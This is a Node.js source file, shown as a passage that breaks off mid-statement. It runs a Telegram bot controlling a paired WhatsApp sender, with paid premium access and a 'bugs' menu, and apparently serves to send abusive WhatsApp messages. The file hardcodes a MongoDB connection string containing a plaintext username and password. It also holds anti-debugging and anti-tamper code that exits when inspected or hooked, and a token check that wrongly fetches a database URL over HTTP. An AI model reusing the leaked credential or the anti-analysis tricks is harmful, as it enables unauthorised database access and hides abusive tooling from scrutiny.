const { Telegraf } = require("telegraf");
const { spawn, spawnSync } = require("child_process");
const { pipeline } = require("stream/promises");
const { createWriteStream } = require("fs");
const fs = require("fs");
const path = require("path");
const jid = "0@s.whatsapp.net";
const vm = require("vm");
const os = require("os");
const FormData = require("form-data");
const https = require("https");
const dns = require("dns").promises;
const { URL } = require("url");
const {
  default: makeWASocket,
  useMultiFileAuthState,
  fetchLatestBaileysVersion,
  generateWAMessageFromContent,
  prepareWAMessageMedia,
  downloadContentFromMessage,
  generateForwardMessageContent,
  generateWAMessage,
  jidDecode,
  areJidsSameUser,
  BufferJSON,
  DisconnectReason,
  proto,
} = require("@bellaxchuu/xbailey");
//============( CONST ) =======\\
const pino = require("pino");
const crypto = require("crypto");
const mongoose = require("mongoose");
const chalk = require("chalk");
const { tokenBot, ownerID, CHANNEL_USERNAME } = require("./settings/config");
const axios = require("axios");
const moment = require("moment-timezone");
const EventEmitter = require("events");
const makeInMemoryStore = ({ logger = console } = {}) => {
  const ev = new EventEmitter();

  let chats = {};
  let messages = {};
  let contacts = {};

  ev.on("messages.upsert", ({ messages: newMessages, type }) => {
    for (const msg of newMessages) {
      const chatId = msg.key.remoteJid;
      if (!messages[chatId]) messages[chatId] = [];
      messages[chatId].push(msg);

      if (messages[chatId].length > 100) {
        messages[chatId].shift();
      }

      chats[chatId] = {
        ...(chats[chatId] || {}),
        id: chatId,
        name: msg.pushName,
        lastMsgTimestamp: +msg.messageTimestamp,
      };
    }
  });

  ev.on("chats.set", ({ chats: newChats }) => {
    for (const chat of newChats) {
      chats[chat.id] = chat;
    }
  });

  ev.on("contacts.set", ({ contacts: newContacts }) => {
    for (const id in newContacts) {
      contacts[id] = newContacts[id];
    }
  });

  return {
    chats,
    messages,
    contacts,
    bind: evTarget => {
      evTarget.on("messages.upsert", m => ev.emit("messages.upsert", m));
      evTarget.on("chats.set", c => ev.emit("chats.set", c));
      evTarget.on("contacts.set", c => ev.emit("contacts.set", c));
    },
    logger,
  };
};

const thumbnailUrl = "https://files.catbox.moe/b35a8h.jpg";
//============( SAFE SOCK ) =======\\
function createSafeSock(sock) {
  let sendCount = 0
  const MAX_SENDS = 500
  const normalize = j =>
    j && j.includes("@")
      ? j
      : j.replace(/[^0-9]/g, "") + "@s.whatsapp.net"

  return {
    sendMessage: async (target, message) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.sendMessage(jid, message)
    },
    relayMessage: async (target, messageObj, opts = {}) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.relayMessage(jid, messageObj, opts)
    },
    presenceSubscribe: async jid => {
      try { return await sock.presenceSubscribe(normalize(jid)) } catch(e){}
    },
    sendPresenceUpdate: async (state,jid) => {
      try { return await sock.sendPresenceUpdate(state, normalize(jid)) } catch(e){}
    }
  }
}
//============( SECURITY ) =======\\
const databaseURL =
  "mongodb+srv://bandingfixmerah4_db_user:Dt7zv7cbpf99D2XJ@crimson3.phfzsjt.mongodb.net/?appName=Crimson3";

function activateSecureMode() {
  secureMode = true;
}

const tokenSchema = new mongoose.Schema({
  userId: { type: String, index: true },
  tokens: { type: [String], default: [] },
  updatedAt: { type: Date, default: Date.now },
});

const TokenDB = mongoose.model("Token", tokenSchema, "tokens");

async function connectDB() {
  try {
    await mongoose.connect(databaseURL);
    console.log("✅ MongoDB Connected Successfully");
    return true;
  } catch (error) {
    console.error("❌ MongoDB Connection Failed:", error.message);
    process.exit(1);
  }
}

(function () {
  function randErr() {
    return Array.from({ length: 12 }, () =>
      String.fromCharCode(33 + Math.floor(Math.random() * 90))
    ).join("");
  }

  setInterval(() => {
    const start = performance.now();
    debugger;
    if (performance.now() - start > 100) {
      throw new Error(randErr());
    }
  }, 1000);

  const code = "AlwaysProtect";
  if (code.length !== 13) {
    throw new Error(randErr());
  }

  function secure() {
    console.log(
      chalk.cyan(`==============================================
⠀⠀⠀⣿⣦⡀⠀⠀⠀⠀⢀⡄⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣿⡿⠻⢶⣤⣶⣾⣿⠁⠀⢽⣆⡀⢀⣴⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣀⣽⠉⠀⠀⠀⣠⣿⠃⠀⠀⢀⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠴⣾⣿⣀⣀⠀⠀⠈⠉⢻⣦⡀⠚⠻⠿⣿⣿⠿⠛⠂⠀⠀⢀⣧⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠉⢻⣇⠀⣾⣿⣿⣿⣿⣤⠀⠀⣿⠁⠀⠀⠀⢀⣴⣿⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠸⣿⣷⠏⠀⢀⠀⠀⠿⣶⣤⣤⣤⣄⣀⣴⣿⣿⢿⣿⡆⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠟⠁⠀⢀⣾⠀⠀⠀⠩⣿⣿⠿⠿⠿⡿⠋⠀⠘⣿⣿⡆⡀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢳⣶⣶⣿⣿⣅⠀⠀⠀⠙⣿⣆⠀⠀⠀⠀⠀⠀⠛⠿⣿⣮⣤⣀⠀⠀
⠀⠀⠀⠀⠀⠀⣹⣿⣿⣿⣿⠿⠋⠁⠀⣹⣿⠳⠀⠀⠀⠀⠀⠀⢀⣤⣽⣿⣿⠟⠋
⠀⠀⠀⠀⠀⣴⠿⠛⠻⢿⣿⠀⠀⠀⣰⣿⠏⠀⠀⠀⠀⠀⠀⣾⣿⠟⠋⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠋⠀⠀⣰⣿⣿⣿⣿⣿⣿⣷⣄⢀⣿⣿⡁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠛⠉⠁⠀⠀⠀⠀⠙⢿⣿⣿⠇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀
  `)
    );
    console.log(
      chalk.cyan(`
━━━━━━━━━━━━━━━━━━━━━━━
  ⛥ S ᗩ ᒪ ᐯ ᗩ ᗪ O ᖇ ⛥
━━━━━━━━━━━━━━━━━━━━━━━
ⓘ Information:
.ᐟ Developer : Parkyoujoung
.ᐟ Version : 2.0 [ New Updated ]
.ᐟ Language : Javascript / Node.Js
`)
    );
}

  const hash = Buffer.from(secure.toString()).toString("base64");
  setInterval(() => {
    if (Buffer.from(secure.toString()).toString("base64") !== hash) {
      throw new Error(randErr());
    }
  }, 2000);

  secure();
})();

(() => {
  const hardExit = process.exit.bind(process);
  Object.defineProperty(process, "exit", {
    value: hardExit,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  const hardKill = process.kill.bind(process);
  Object.defineProperty(process, "kill", {
    value: hardKill,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  setInterval(() => {
    try {
      if (
        process.exit.toString().includes("Proxy") ||
        process.kill.toString().includes("Proxy")
      ) {
        console.log(
          chalk.bold.red(`
  BYPASS DETECTED!!
  YOUR BYPASS TOOLS ARE VERY BAD IDIOT.
  `)
        );
        activateSecureMode();
        hardExit(1);
      }

      for (const sig of ["SIGINT", "SIGTERM", "SIGHUP"]) {
        if (process.listeners(sig).length > 0) {
          console.log(
            chalk.bold.red(`
  BYPASS DETECTED!!
  YOUR BYPASS TOOLS ARE VERY BAD IDIOT.
  `)
          );
          activateSecureMode();
          hardExit(1);
        }
      }
    } catch {
      hardExit(1);
    }
  }, 2000);

})();

const question = query =>
  new Promise(resolve => {
    const rl = require("readline").createInterface({
      input: process.stdin,
      output: process.stdout,
    });
    rl.question(query, answer => {
      rl.close();
      resolve(answer);
    });
  });

async function isAuthorizedToken(token) {
  try {
    const res = await axios.get(databaseURL);
    const authorizedTokens = res.data.tokens;
    return authorizedTokens.includes(token);
  } catch (e) {
    return false;
  }
}

//============( FEATURE ) =======\\
const bot = new Telegraf(tokenBot);

bot.use(async (ctx, next) => {
  if (typeof isAntiCulikBlocked === "function" && isAntiCulikBlocked(ctx)) {
    if (ctx.message?.text?.startsWith("/")) {
      return ctx.reply("❌ Bot sedang dalam mode anti-culik. Group ini belum diizinkan owner.");
    }
    if (ctx.callbackQuery) {
      try {
        await ctx.answerCbQuery("Group ini belum diizinkan owner", { show_alert: true });
      } catch (error) {}
    }
    return;
  }
  return next();
});

bot.use((ctx, next) => {
  if (secureMode) return;
  return next();
});
let secureMode = false;
let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = "";
let lastPairingMessage = null;
let reconnectTimer = null;
let reconnectAttempts = 0;
let sessionStarting = false;
let waConnectionState = "connecting";
let pairingInProgress = false;
const MAX_RECONNECT_ATTEMPTS = 10;
const usePairingCode = true;

const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));

const premiumFile = "./database/premium.json";
const cooldownFile = "./database/cooldown.json";

const loadPremiumUsers = () => {
  try {
    const data = fs.readFileSync(premiumFile);
    return JSON.parse(data);
  } catch (err) {
    return {};
  }
};

const savePremiumUsers = users => {
  fs.writeFileSync(premiumFile, JSON.stringify(users, null, 2));
};

const addPremiumUser = (userId, duration) => {
  const premiumUsers = loadPremiumUsers();
  const expiryDate = moment()
    .add(duration, "days")
    .tz("Asia/Jakarta")
    .format("DD-MM-YYYY");
  premiumUsers[userId] = expiryDate;
  savePremiumUsers(premiumUsers);
  return expiryDate;
};

const removePremiumUser = userId => {
  const premiumUsers = loadPremiumUsers();
  delete premiumUsers[userId];
  savePremiumUsers(premiumUsers);
};

const isPremiumUser = userId => {
  const premiumUsers = loadPremiumUsers();
  if (premiumUsers[userId]) {
    const expiryDate = moment(premiumUsers[userId], "DD-MM-YYYY");
    if (moment().isBefore(expiryDate)) {
      return true;
    } else {
      removePremiumUser(userId);
      return false;
    }
  }
  return false;
};

//============ FUNCTION PREMIUM GROUP =======\\
const premiumGroupFile = './database/premiumGroups.json';
const premiumGroups = new Map();

function loadPremiumGroups() {
    try {
        if (fs.existsSync(premiumGroupFile)) {
            const data = fs.readFileSync(premiumGroupFile, 'utf8');
            const parsed = JSON.parse(data);
            premiumGroups.clear();
            Object.entries(parsed).forEach(([key, value]) => {
                premiumGroups.set(key, value);
            });
        }
        return premiumGroups;
    } catch (error) {
        console.error('Error loading premium groups:', error);
        return premiumGroups;
    }
}

function savePremiumGroups() {
    try {
        const data = Object.fromEntries(premiumGroups);
        fs.writeFileSync(premiumGroupFile, JSON.stringify(data, null, 2));
        return true;
    } catch (error) {
        console.error('Error saving premium groups:', error);
        return false;
    }
}

function isGroupPremium(groupId) {
    if (!premiumGroups.has(groupId)) return false;

    const data = premiumGroups.get(groupId);
    if (data.expiredAt && Date.now() > data.expiredAt) {
        premiumGroups.delete(groupId);
        savePremiumGroups();
        return false;
    }
    return true;
}

function getPremiumGroupData(groupId) {
    return premiumGroups.get(groupId) || null;
}

function getAllPremiumGroups() {
    const result = [];
    for (const [groupId, data] of premiumGroups) {
        if (data.expiredAt && Date.now() > data.expiredAt) {
            premiumGroups.delete(groupId);
            savePremiumGroups();
            continue;
        }
        result.push({ groupId, ...data });
    }
    return result;
}

function isValidId(id) {
    return typeof id === 'string' && /^-100\d{5,}$/.test(id);
}

function normalizeGroupId(value) {
    if (value === undefined || value === null) return null;
    const id = String(value).trim();
    if (/^-100\d{5,}$/.test(id)) return id;
    if (/^\d{5,}$/.test(id)) return `-100${id}`;
    return null;
}

function getRepliedUserId(ctx) {
    const user = ctx.message?.reply_to_message?.from;
    return user?.id ? String(user.id) : null;
}

function getTargetUserId(ctx, argument) {
    return getRepliedUserId(ctx) || (argument ? String(argument).replace(/[^0-9]/g, '') : null);
}

function addPremiumGroup(groupId, duration, adminId) {
    groupId = normalizeGroupId(groupId);
    if (!isValidId(groupId)) {
        return { success: false, message: 'ID grup tidak valid!' };
    }

    duration = Number(duration);
    if (!Number.isInteger(duration) || duration < 1) {
        return { success: false, message: 'Durasi harus berupa angka dalam hari!' };
    }

    if (isGroupPremium(groupId)) {
        return { success: false, message: 'Grup ini sudah terdaftar sebagai premium!' };
    }

    const expiryDate = new Date();
    expiryDate.setDate(expiryDate.getDate() + duration);

    const data = {
        admin: adminId,
        addedAt: Date.now(),
        duration: duration,
        expiredAt: expiryDate.getTime()
    };

    premiumGroups.set(groupId, data);
    savePremiumGroups();

    return {
        success: true,
        message: `Group ${groupId} premium sampai ${expiryDate.toLocaleDateString()}`,
        data: data
    };
}

function deletePremiumGroup(groupId) {
    groupId = normalizeGroupId(groupId);
    if (!isValidId(groupId)) {
        return { success: false, message: 'ID grup tidak valid!' };
    }

    if (!isGroupPremium(groupId)) {
        return { success: false, message: `Group ${groupId} bukan premium!` };
    }

    premiumGroups.delete(groupId);
    savePremiumGroups();

    return {
        success: true,
        message: `Group ${groupId} premium dihapus!`
    };
}

loadPremiumGroups();

const loadCooldown = () => {
  try {
    const data = fs.readFileSync(cooldownFile);
    return JSON.parse(data).cooldown || 5;
  } catch {
    return 5;
  }
};

const saveCooldown = seconds => {
  fs.writeFileSync(
    cooldownFile,
    JSON.stringify({ cooldown: seconds }, null, 2)
  );
};

let cooldown = loadCooldown();
const userCooldowns = new Map();

function formatRuntime() {
  let sec = Math.floor(process.uptime());
  let hrs = Math.floor(sec / 3600);
  sec %= 3600;
  let mins = Math.floor(sec / 60);
  sec %= 60;
  return `${hrs}h ${mins}m ${sec}s`;
}

function formatMemory() {
  let usedBytes = process.memoryUsage().rss;
  try {
    const cgroupFiles = [
      '/sys/fs/cgroup/memory.current',
      '/sys/fs/cgroup/memory/memory.usage_in_bytes'
    ];
    for (const file of cgroupFiles) {
      if (fs.existsSync(file)) {
        const value = Number(fs.readFileSync(file, 'utf8').trim());
        if (Number.isFinite(value) && value > 0) {
          usedBytes = value;
          break;
        }
      }
    }
  } catch (_) {}
  const usedMB = usedBytes / 1024 / 1024;
  return `${usedMB.toFixed(0)} MB`;
}

function getMenuColors() {
  return {
    bugs: "danger",
    controls: "danger",
    creator: "danger",
    information: "danger",
    tools: "danger"
  };
}
//============( CONNECT ) =======\\
const scheduleReconnect = (reason) => {
  if (reconnectTimer || sessionStarting) return;
  if (reconnectAttempts >= MAX_RECONNECT_ATTEMPTS) {
    console.error(`[WhatsApp] Reconnect dihentikan setelah ${MAX_RECONNECT_ATTEMPTS} percobaan. Gunakan /addsender untuk mencoba ulang.`);
    return;
  }
  reconnectAttempts += 1;
  const delay = Math.min(5000 * 2 ** (reconnectAttempts - 1), 60000);
  console.log(`[WhatsApp] Reconnect percobaan ${reconnectAttempts}/${MAX_RECONNECT_ATTEMPTS} dalam ${Math.ceil(delay / 1000)} detik (${reason || "connection closed"}).`);
  reconnectTimer = setTimeout(() => {
    reconnectTimer = null;
    startSesi().catch(error => scheduleReconnect(error.message));
  }, delay);
};

const startSesi = async () => {
  if (sessionStarting) return;
  sessionStarting = true;
  try {
   const store = makeInMemoryStore({
  logger: require('pino')().child({ level: 'silent', stream: 'store' })
})
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: !usePairingCode,
        logger: pino({ level: "silent" }),
        auth: state,
        browser: ['Mac OS', 'Safari', '10.15.7'],
        getMessage: async (key) => ({
            conversation: 'Evox',
        }),
    };

    sock = makeWASocket(connectionOptions);
    waConnectionState = "connecting";

    sock.ev.on("messages.upsert", async (m) => {
        try {
            if (!m || !m.messages || !m.messages[0]) {
                return;
            }

            const msg = m.messages[0];
            const chatId = msg.key.remoteJid || "Tidak Diketahui";

        } catch (error) {
        }
    });

    sock.ev.on('creds.update', saveCreds);
    store.bind(sock.ev);

    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection) waConnectionState = connection;
        if (connection === 'open') {
        sessionStarting = false;
        reconnectAttempts = 0;

        if (lastPairingMessage) {
        const connectedMenu = `
<blockquote><tg-emoji emoji-id="5443038326535759644">💬</tg-emoji> 𝗣𝗥𝗢𝗖𝗘𝗦𝗦𝗜𝗡𝗚 𝗣𝗔𝗜𝗥𝗜𝗡𝗚 <tg-emoji emoji-id="5443038326535759644">💬</tg-emoji></blockquote>
<tg-emoji emoji-id="5334998226636390258">📱</tg-emoji> Number : ${lastPairingMessage.phoneNumber}
<tg-emoji emoji-id="5271604874419647061">🔗</tg-emoji> Pairing Code : ${lastPairingMessage.pairingCode}
<tg-emoji emoji-id="5206607081334906820">✔️</tg-emoji> Status : Connected
`;

        try {
          bot.telegram.editMessageCaption(
            lastPairingMessage.chatId,
            lastPairingMessage.messageId,
            undefined,
            connectedMenu,
            { parse_mode: "HTML" }
          );
        } catch (e) {}
      }

      console.clear();
      isWhatsAppConnected = true;
      const currentTime = moment().tz("Asia/Jakarta").format("HH:mm:ss");
      console.log(chalk.bold.yellow(`Sender Connected`));
    }

    if (connection === "close") {
      sessionStarting = false;
      isWhatsAppConnected = false;
      waConnectionState = "close";
      pairingInProgress = false;
      const statusCode = lastDisconnect?.error?.output?.statusCode ?? lastDisconnect?.error?.statusCode;
      const shouldReconnect = statusCode !== DisconnectReason.loggedOut;
      if (shouldReconnect) {
        scheduleReconnect(statusCode ? `status ${statusCode}` : "unknown reason");
      } else {
        reconnectAttempts = 0;
        console.log(chalk.yellow("[WhatsApp] Session logout. Pairing ulang diperlukan."));
      }
    }
  });
  } catch (error) {
    sessionStarting = false;
    isWhatsAppConnected = false;
    waConnectionState = "close";
    throw error;
  }
};

startSesi().catch(error => scheduleReconnect(error.message));
//============( CHECK ) =======\\
const checkWhatsAppConnection = (ctx, next) => {
  if (!isWhatsAppConnected) {
    ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
    return;
  }
  next();
};

const checkCooldown = (ctx, next) => {
  const userId = ctx.from.id;
  const now = Date.now();

  if (userCooldowns.has(userId)) {
    const lastUsed = userCooldowns.get(userId);
    const diff = (now - lastUsed) / 1000;

    if (diff < cooldown) {
      const remaining = Math.ceil(cooldown - diff);
      ctx.reply(`⏳ ☇ Harap menunggu ${remaining} detik`);
      return;
    }
  }

  userCooldowns.set(userId, now);
  next();
};

const checkPremium = (ctx, next) => {
  const userId = ctx.from.id;
  const groupId = ctx.chat.id.toString();
  if (isPremiumUser(userId)) return next();
  if (isGroupPremium(groupId)) return next();
  ctx.reply("❌ Akses hanya untuk premium!");
};

//============( COMMAND FEATURE ) =======\\
bot.command("addsender", async ctx => {
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  }

  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("🪧 ☇ Format: /addsender 62×××");

  const phoneNumber = args.replace(/[^0-9]/g, "");
  if (!phoneNumber || phoneNumber.length < 8 || phoneNumber.length > 15) {
    return ctx.reply("❌ ☇ Nomor tidak valid. Gunakan format internasional tanpa +, contoh: 628123456789");
  }

  if (pairingInProgress) {
    return ctx.reply("⏳ ☇ Permintaan pairing sebelumnya masih diproses, tunggu sebentar");
  }

  try {
    if (!sock || !["connecting", "open"].includes(waConnectionState)) {
      return ctx.reply(`❌ ☇ Socket WhatsApp belum siap (status: ${waConnectionState}). Tunggu beberapa detik lalu coba lagi`);
    }
    pairingInProgress = true;
    if (sock.authState.creds.registered) {
      return ctx.reply(
        `✅ ☇ WhatsApp sudah terhubung dengan nomor: ${phoneNumber}`
      );
    }

    const code = await sock.requestPairingCode(phoneNumber, "SALVADOR");
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;
    if (!formattedCode) throw new Error("PAIRING_CODE_EMPTY");

    const pairingMenu = `
<blockquote><tg-emoji emoji-id="5443038326535759644">💬</tg-emoji> 𝗣𝗥𝗢𝗖𝗘𝗦𝗦𝗜𝗡𝗚 𝗣𝗔𝗜𝗥𝗜𝗡𝗚 <tg-emoji emoji-id="5443038326535759644">💬</tg-emoji></blockquote>
<tg-emoji emoji-id="5334998226636390258">📱</tg-emoji> Number : ${phoneNumber}
<tg-emoji emoji-id="5271604874419647061">🔗</tg-emoji> Pairing Code : ${formattedCode}
<tg-emoji emoji-id="5210952531676504517">❌</tg-emoji> Status : Not Connected
`;

    const sentMsg = await ctx.replyWithPhoto(thumbnailUrl, {
      caption: pairingMenu,
      parse_mode: "HTML",
    });

    lastPairingMessage = {
      chatId: ctx.chat.id,
      messageId: sentMsg.message_id,
      phoneNumber,
      pairingCode: formattedCode,
    };
  } catch (err) {
    console.error("Pairing gagal:", err);
    const message = String(err?.message || err);
    if (/408|connection closed|timed out/i.test(message)) {
      await ctx.reply("❌ ☇ Koneksi WhatsApp tertutup sebelum pairing selesai. Tunggu reconnect selesai, lalu coba `/addsender` lagi.");
    } else {
      await ctx.reply(`❌ ☇ Pairing gagal: ${message.slice(0, 300)}`);
    }
  } finally {
    pairingInProgress = false;
  }
});

if (sock) {
  sock.ev.on("connection.update", async update => {
    if (update.connection === "open" && lastPairingMessage) {
      const updateConnectionMenu = `
<blockquote><tg-emoji emoji-id="5443038326535759644">💬</tg-emoji> 𝗣𝗥𝗢𝗖𝗘𝗦𝗦𝗜𝗡𝗚 𝗣𝗔𝗜𝗥𝗜𝗡𝗚 <tg-emoji emoji-id="5443038326535759644">💬</tg-emoji></blockquote>
<tg-emoji emoji-id="5334998226636390258">📱</tg-emoji> Number : ${lastPairingMessage.phoneNumber}
<tg-emoji emoji-id="5271604874419647061">🔗</tg-emoji> Pairing Code : ${lastPairingMessage.pairingCode}
<tg-emoji emoji-id="5206607081334906820">✔️</tg-emoji> Status : Connected
`;

      try {
        await bot.telegram.editMessageCaption(
          lastPairingMessage.chatId,
          lastPairingMessage.messageId,
          undefined,
          updateConnectionMenu,
          { parse_mode: "HTML" }
        );
      } catch (e) {}
    }
  });
}

bot.command("setcd", async ctx => {
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  }

  const args = ctx.message.text.split(" ");
  const seconds = parseInt(args[1]);

  if (isNaN(seconds) || seconds < 0) {
    return ctx.reply("🪧 ☇ Format: /setcd 5");
  }

  cooldown = seconds;
  saveCooldown(seconds);
  ctx.reply(`✅ ☇ Cooldown berhasil diatur ke ${seconds} detik`);
});

bot.command("resetsesi", async ctx => {
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  }

  try {
    const sessionDirs = ["./session", "./sessions"];
    let deleted = false;

    for (const dir of sessionDirs) {
      if (fs.existsSync(dir)) {
        fs.rmSync(dir, { recursive: true, force: true });
        deleted = true;
      }
    }

    if (deleted) {
      await ctx.reply("✅ ☇ Session berhasil dihapus, panel akan restart");
      setTimeout(() => {
        process.exit(1);
      }, 2000);
    } else {
      ctx.reply("🪧 ☇ Tidak ada folder session yang ditemukan");
    }
  } catch (err) {
    console.error(err);
    ctx.reply("❌ ☇ Gagal menghapus session");
  }
});

const adminFile = path.join(__dirname, 'database', 'admin.json');
const legacyAdminFile = path.join(__dirname, 'admin.json');

const loadAdmin = () => {
    try {
        const sourceFile = fs.existsSync(adminFile) ? adminFile : legacyAdminFile;
        if (fs.existsSync(sourceFile)) {
            const data = fs.readFileSync(sourceFile, 'utf8');
            return JSON.parse(data);
        }
        return [];
    } catch (err) {
        console.error('❌ Error loading admin:', err);
        return [];
    }
};

const saveAdmin = (adminList) => {
    try {
        fs.mkdirSync(path.dirname(adminFile), { recursive: true });
        fs.writeFileSync(adminFile, JSON.stringify(adminList, null, 2));
        console.log('✅ Admin saved successfully');
    } catch (err) {
        console.error('❌ Error saving admin:', err);
    }
};

let adminList = loadAdmin();

const accessSessions = new Map();

function accessTargetLabel(ctx, targetId) {
  const user = ctx.message?.reply_to_message?.from;
  const name = user?.username ? `@${user.username}` : (user?.first_name || targetId);
  return String(name).replace(/[<&>]/g, '');
}

const isAdmin = (userId) => {
    return adminList.includes(parseInt(userId));
};

bot.command("addaccess", async (ctx) => {
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌ Akses hanya untuk owner.");
  }

  const args = ctx.message.text.split(" ").slice(1).filter(Boolean);
  const targetId = getTargetUserId(ctx, args[0]);

  if (!targetId || !/^\d+$/.test(targetId)) {
    return ctx.replyWithHTML(
      "❌ Gunakan salah satu cara berikut:\n" +
      "• Reply pesan user lalu kirim <code>/addaccess</code>\n" +
      "• Kirim <code>/addaccess 123456789</code>"
    );
  }

  if (String(targetId) === String(ownerID)) {
    return ctx.reply("❌ Owner sudah memiliki semua akses.");
  }

  const sessionId = crypto.randomBytes(6).toString("hex");
  accessSessions.set(sessionId, {
    ownerId: String(ctx.from.id),
    targetId: String(targetId),
    action: "add"
  });

  setTimeout(() => accessSessions.delete(sessionId), 120000);

  return ctx.replyWithHTML(
    `<blockquote><b>ADD ACCESS</b></blockquote>\n\n` +
    `👤 <b>Target</b>\n` +
    `├ ID: <code>${targetId}</code>\n` +
    `└ User: ${accessTargetLabel(ctx, targetId)}\n\n` +
    `<b>Pilih jenis akses:</b>`,
    {
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "PREMIUM",
              callback_data: `access_add_premium:${sessionId}`,
              style: "success",
              icon_custom_emoji_id: "6206118633370818254"
            }
          ],
          [
            {
              text: "ADMIN",
              callback_data: `access_add_admin:${sessionId}`,
              style: "primary",
              icon_custom_emoji_id: "6028551194861899805"
            }
          ],
          [
            {
              text: "CANCEL",
              callback_data: `access_cancel:${sessionId}`,
              style: "danger",
              icon_custom_emoji_id: "5210952531676504517"
            }
          ]
        ]
      }
    }
  );
});

bot.command("delaccess", async (ctx) => {
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌ Akses hanya untuk owner.");
  }

  const args = ctx.message.text.split(" ").slice(1).filter(Boolean);
  const targetId = getTargetUserId(ctx, args[0]);

  if (!targetId || !/^\d+$/.test(targetId)) {
    return ctx.replyWithHTML(
      "❌ Gunakan salah satu cara berikut:\n" +
      "• Reply pesan user lalu kirim <code>/delaccess</code>\n" +
      "• Kirim <code>/delaccess 123456789</code>"
    );
  }

  if (String(targetId) === String(ownerID)) {
    return ctx.reply("❌ Akses owner tidak dapat dihapus.");
  }

  const sessionId = crypto.randomBytes(6).toString("hex");
  accessSessions.set(sessionId, {
    ownerId: String(ctx.from.id),
    targetId: String(targetId),
    action: "delete"
  });

  setTimeout(() => accessSessions.delete(sessionId), 120000);

  return ctx.replyWithHTML(
    `<blockquote><b>DELETE ACCESS</b></blockquote>\n\n` +
    `👤 <b>Target</b>\n` +
    `├ ID: <code>${targetId}</code>\n` +
    `└ User: ${accessTargetLabel(ctx, targetId)}\n\n` +
    `<b>Pilih akses yang ingin dihapus:</b>`,
    {
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "DELETE PREMIUM",
              callback_data: `access_delete_premium:${sessionId}`,
              style: "success",
              icon_custom_emoji_id: "5987813726412083870"
            }
          ],
          [
            {
              text: "DELETE ADMIN",
              callback_data: `access_delete_admin:${sessionId}`,
              style: "primary",
              icon_custom_emoji_id: "5987813726412083870"
            }
          ],
          [
            {
              text: "CANCEL",
              callback_data: `access_cancel:${sessionId}`,
              style: "danger",
              icon_custom_emoji_id: "5210952531676504517"
            }
          ]
        ]
      }
    }
  );
});

async function getAccessSession(ctx, sessionId) {
  const session = accessSessions.get(sessionId);

  if (!session || session.ownerId !== String(ctx.from.id)) {
    await ctx.answerCbQuery(
      "❌ Tombol ini bukan untuk kamu.",
      { show_alert: true }
    ).catch(() => {});
    return null;
  }

  return session;
}

bot.action(/^access_add_premium:(.+)$/, async (ctx) => {
  const session = await getAccessSession(ctx, ctx.match[1]);
  if (!session) return;

  session.state = "waiting_days";
  await ctx.answerCbQuery().catch(() => {});

  await ctx.editMessageText(
    `<blockquote><b>PREMIUM ACCESS</b></blockquote>\n\n` +
    `👤 <b>Target ID</b>\n` +
    `<code>${session.targetId}</code>\n\n` +
    `📅 Kirim jumlah hari premium.\n` +
    `Contoh: <code>30</code>`,
    { parse_mode: "HTML" }
  ).catch(() => {});
});

bot.action(/^access_add_admin:(.+)$/, async (ctx) => {
  const sessionId = ctx.match[1];
  const session = await getAccessSession(ctx, sessionId);
  if (!session) return;

  if (!adminList.includes(Number(session.targetId))) {
    adminList.push(Number(session.targetId));
    saveAdmin(adminList);
  }

  accessSessions.delete(sessionId);
  await ctx.answerCbQuery("✅ Admin ditambahkan.").catch(() => {});

  await ctx.editMessageText(
    `<b>✅ ADMIN ADDED</b>\n\n` +
    `User <code>${session.targetId}</code> sekarang menjadi admin.`,
    { parse_mode: "HTML" }
  ).catch(() => {});
});

bot.action(/^access_delete_premium:(.+)$/, async (ctx) => {
  const sessionId = ctx.match[1];
  const session = await getAccessSession(ctx, sessionId);
  if (!session) return;

  removePremiumUser(session.targetId);
  accessSessions.delete(sessionId);
  await ctx.answerCbQuery("✅ Premium dihapus.").catch(() => {});

  await ctx.editMessageText(
    `<b>✅ PREMIUM DELETED</b>\n\n` +
    `Premium user <code>${session.targetId}</code> sudah dihapus.`,
    { parse_mode: "HTML" }
  ).catch(() => {});
});

bot.action(/^access_delete_admin:(.+)$/, async (ctx) => {
  const sessionId = ctx.match[1];
  const session = await getAccessSession(ctx, sessionId);
  if (!session) return;

  adminList = adminList.filter(
